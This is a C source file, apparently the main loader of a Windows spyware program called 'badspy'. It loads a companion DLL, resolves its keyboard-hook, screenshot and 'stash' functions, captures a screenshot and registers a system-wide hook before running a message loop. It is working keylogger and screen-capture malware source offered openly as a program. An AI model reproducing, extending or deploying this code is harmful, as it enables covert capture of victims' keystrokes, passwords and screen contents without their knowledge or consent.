#include <stdio.h>
#include <windows.h>
#include "proc.h"
#include "main.h"
#include "../../log-cpp/log.h"
#include <Gdiplus.h>
#include <Shlwapi.h>
#define ERROR_CODE 1
#define OK_CODE 1

HMODULE badspyModule = NULL;
HMODULE badspyDllModule = NULL;

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	if (!init_library())
		return ERROR_CODE;
	
	if (!init_dll_func())
		return ERROR_CODE;
	take_screenshot();
	if (!init_hook())
		return ERROR_CODE;

	start_looper();

	return OK_CODE;
}

void start_looper()
{
	LOG("start looper");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	LOG("stop looper");
}

bool init_library()
{
	LOG("loading dll library");
	if ((badspyDllModule = LoadLibrary(L"badspy.c.dll")) == NULL)
		return false;
	badspyModule = GetModuleHandle(L"badspy.c.dll");
	if (badspyModule == NULL)
		return false;
	LOG("loaded dll library");
	return true;
}

bool init_dll_func()
{
	LOG("loading dll functions");
	register_hook = (REGISTER_HOOK_PROC)GetProcAddress(badspyModule, "register_hook");
	if (register_hook == NULL)
		return false;
	unregister_hook = (UNREGISTER_HOOK_PROC)GetProcAddress(badspyModule, "unregister_hook");
	if (unregister_hook == NULL)
		return false;
	kb_hook_proc = (KB_HOOK_PROC)GetProcAddress(badspyModule, "kb_hook_proc");
	if (kb_hook_proc == NULL)
		return false;
	quit = (QUIT_PROC)GetProcAddress(badspyModule, "quit");
	if (quit == NULL)
		return false;
	init_stash = (INIT_STASH_PROC)GetProcAddress(badspyModule, "init_stash");
	if (init_stash == NULL)
		return false;
	take_screenshot = (TAKE_SCREENSHOT_PROC)GetProcAddress(badspyModule, "take_screenshot");
	if (take_screenshot == NULL)
		return false;
	LOG("loaded dll functions");
	return true;
}

bool init_hook()
{
	LOG("hook system");
	DWORD ret = register_hook();
	if (ret == 0)
		return true;
	LOG_E("can't hook system code %d", ret);
	return false;
}

void free_library()
{
	LOG("free dll library");
	if (badspyDllModule != NULL)
	{
		FreeLibrary(badspyDllModule);
		badspyDllModule = NULL;
	}
}